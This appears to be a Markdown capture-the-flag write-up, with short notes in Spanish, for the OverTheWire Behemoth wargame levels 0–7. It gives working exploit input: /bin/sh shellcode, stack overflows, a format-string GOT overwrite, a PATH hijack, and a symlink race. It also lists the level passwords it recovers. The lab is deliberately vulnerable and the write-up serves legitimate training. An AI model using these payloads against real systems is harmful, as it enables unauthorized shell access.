# Behemoth - LAB_4

## Behemoth0
ssh behemoth0@narnia.labs.overthewire.org -p 2221
behemoth0

~~~
cd /behemoth/
./behemoth0

ltrace ./behemoth0
./behemoth0
whoami
cat /etc/behemoth_pass/behemoth1

aesebootiv
~~~

## Behemoth1
ssh behemoth1@narnia.labs.overthewire.org -p 2221

~~~
cd /behemoth/
./behemoth1

(python -c "print 128 * 'A'") | ./behemoth1

gdb -q ./behemoth1
set disassembly-flavor intel
disas main

run < <(python -c 'print 71 * "A" + "BBBB"')
export SHELLCODE=$(python -c 'print 20 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + 20 * "\x90"')

gdb -q behemoth1
set disassembly-flavor intel
break *main
run
x/s *((char **)environ)
run < <(python -c 'print 71 * "\x90" +  "\x62\xde\xff\xff"')
continue
~~~
encontraremos la dirección de la variable SHELLCODE fuera de GDB usando el siguiente código
~~~
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char* argv[])
{
  printf("%s is at %p\n", argv[1], getenv(argv[1]));
}
~~~

~~~
cd /tmp/
gcc -m32 find_addr.c -o find_addr
./find_addr SHELLCODE
(python -c 'print 71 * "\x90" + "\x80\xde\xff\xff"';cat) | ./behemoth1
whoami
cat /etc/behemoth_pass/behemoth2

eimahquuof
~~~

## Behemoth2
ssh behemoth2@narnia.labs.overthewire.org -p 2221

~~~
cd /behemoth/
ltrace ./behemoth2

mkdir ax
cd ax
echo "cat /etc/behemoth_pass/behemoth3" > /tmp/ax/touch
chmod 777 touch
/behemoth/behemoth2

nieteidiel
~~~

## Behemoth3
ssh behemoth3@narnia.labs.overthewire.org -p 2221

~~~
./behemoth3
gdb -q ./behemoth2
set disassembly-flavor intel
disas main
~~~

sobrescribir la llamada a puts() con una dirección contenida en las variables de entorno

~~~
objdump -R behemoth3
export SHELLCODE=$(python -c 'print 20 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + 20 * "\x90"')
gdb -q behemoth3
set disassembly-flavor intel
x/s *((char **)environ)
break *main
x/s *((char **)environ)
run
x/s *((char **)environ)

break *main+81
run
x/wx 0x080497ac
continue

/tmp/find_addr SHELLCODE
(python -c 'print "\xac\x97\x04\x08\xae\x97\x04\x08%56941x%1$hn%8586x%2$hn"';cat) | ./behemoth3
whoami
cat /etc/behemoth_pass/behemoth4

ietheishei
~~~

## Behemoth4
ssh behemoth4@narnia.labs.overthewire.org -p 2221

~~~
ltrace ./behemoth4
~~~
podríamos pausar el proceso justo después de iniciarlo
~~~
/behemoth/behemoth4&
PID=$!
kill -STOP $PID
ln -s /etc/behemoth_pass/behemoth5 /tmp/$PID
kill -CONT $PID
echo $PID
~~~

~~~
/tmp/test.sh
Finished sleeping, fgetcing

aizeeshing
~~~

## Behemoth5
ssh behemoth5@narnia.labs.overthewire.org -p 2221

~~~
ltrace ./behemoth5
gdb -q ./behemoth5
break *main
set disassembly-flavor intel
run
disas main
x/s 0x80489e4
~~~

ejecutemos un oyente UDP local en el puerto 1337 y ejecutemos el ejecutable.

~~~
./behemoth5
nc -ulp 1337

mayiroeche
~~~

## Behemoth6
ssh behemoth6@narnia.labs.overthewire.org -p 2221

~~~
./behemoth6
./behemoth6_reader
ltrace ./behemoth6
~~~

solo necesitamos escribir un shellcode que imprima HelloKitty.

~~~
BITS 32

jmp short string

code:
	pop ecx
	xor eax, eax
	mov al, 4
	xor ebx, ebx
	inc ebx
	xor edx, edx
	mov dl, 10
	int 0x80

	mov al, 1
	dec ebx
	int 0x80

string:
	call code
	db "HelloKitty"
~~~

~~~
cd /tmp/
mkdir aux
cd aux
nasm HelloKitty.asm
ndisasm  -b32 HelloKitty
(python -c "print '\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x0a\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x48\x65\x6c\x6c\x6f\x4b\x69\x74\x74\x79'") > /tmp/aux/shellcode.txt
chmod 777 shellcode.txt
/behemoth/behemoth6
whoami
cat /etc/behemoth_pass/behemoth7

baquoxuafo
~~~

## Behemoth7
ssh behemoth7@narnia.labs.overthewire.org -p 2221

~~~
ltrace ./behemoth7 AAAA
~~~
recibimos una llamada a strcpy() con nuestro argumento, intentermos desbordarlo
~~~
gdb -q ./behemoth7
set disassembly-flavor intel
run $(python -c "print 600 * 'A'")
run $(python -c "print 528 * 'A' + 'BBBB'")
run $(python -c "print 507 * '\x90' + '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + 'BBBB'")
run $(python -c "print 528 * '\x41' + 'BBBB' + 200 * '\x90' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
x/500wx $esp
run $(python -c "print 528 * '\x41' + '\xe0\xd7\xff\xff' + 200 * '\x90' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")

./behemoth7 $(python -c "print 528 * '\x41' + '\xe0\xd7\xff\xff' + 200 * '\x90' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
whoami
cat /etc/behemoth_pass/behemoth8

pheewij7Ae
~~~